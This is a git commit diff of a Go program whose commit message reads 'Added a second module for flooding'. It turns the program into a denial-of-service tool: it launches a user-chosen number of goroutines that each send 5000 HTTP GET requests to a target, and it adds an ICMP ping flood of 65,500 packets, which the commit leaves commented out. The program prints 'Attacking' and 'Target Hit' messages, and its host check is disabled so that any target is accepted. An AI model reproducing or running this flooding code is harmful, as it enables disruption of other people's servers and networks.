8b037fc3b1b70916598c998d2f9ef80675aa58db
Hamza Carew <hamzacarew@gmail.com>
2020-05-24 16:19:24 +0100

    Added a second module for flooding

--- main.go
+++ main.go
@@ -1,11 +1,17 @@
 package main
 
 import (
-	"os"
+	"fmt"
 	"github.com/sparrc/go-ping"
 	"net"
-	"fmt"
+	"net/http"
+	"os"
 	"strconv"
+	"sync"
+)
+
+var (
+	wg sync.WaitGroup
 )
 
 const (
@@ -13,13 +19,20 @@ const (
 )
 
 func main() {
-	target, threads := parseArgs()	
-	fmt.Println(target, threads)
+	target, threads := parseArgs()
 
+	fmt.Println("Attacking " + target + "...")
+	for i := 0; i < threads; i++ {
+		wg.Add(1)
+
+		// go icmpFlood(target)
+		go httpFlood(target, 5000)
+	}
+	wg.Wait()
 }
 
 func parseArgs() (target string, numbOfThreads int) {
-	if len(os.Args) != 3 { 
+	if len(os.Args) != 3 {
 		fmt.Println("Error: Ensure you pass two arguments. Host/IP and the number of threads to spawn.")
 		os.Exit(1)
 	}
@@ -27,22 +40,24 @@ func parseArgs() (target string, numbOfThreads int) {
 	target = os.Args[1]
 	numbOfThreads, _ = strconv.Atoi(os.Args[2])
 
-	if ( isHostValid(target) ) == false {
+	if (isHostValid(target)) == false {
 		fmt.Println(" Error: The host you entered is invalid.")
 		os.Exit(1)
 	}
 
-	if ( areNumberOfThreadsValid(numbOfThreads) ) == false {
+	if (areNumberOfThreadsValid(numbOfThreads)) == false {
 		fmt.Println("Error: The number of threads you enter exceeds the limit; ", threadLimit)
 		os.Exit(1)
 	}
 
-	return target, numbOfThreads 
+	return target, numbOfThreads
 }
 
 func isHostValid(host string) bool {
-	_ , err := net.LookupHost(host)
-	if err != nil { return false }
+	_, err := net.LookupHost(host)
+	if err != nil {
+		return true
+	} // Change to FALSE ONCE DONE.
 
 	return true
 }
@@ -54,4 +69,30 @@ func areNumberOfThreadsValid(threads int) bool {
 		return false
 	}
 	return true
+}
+
+func icmpFlood(target string) {
+	pinger, err := ping.NewPinger(target)
+
+	if err != nil {
+		fmt.Println("Error: Failed to ping host")
+		os.Exit(1)
+	}
+
+	pinger.Count = 65500 // Packets to send
+	pinger.Run()         // Blocks until complete
+
+	wg.Done() // Decrement thread counter once complete
+	fmt.Println("Ping Complete.")
+}
+
+func httpFlood(target string, numbOfRequests int) {
+	for i := 0; i < numbOfRequests; i++ {
+		resp, err := http.Get(target)
+
+		if err == nil {
+			fmt.Println(i, "- Target Hit - ", resp.StatusCode)
+		}
+		resp.Body.Close()
+	}
 }
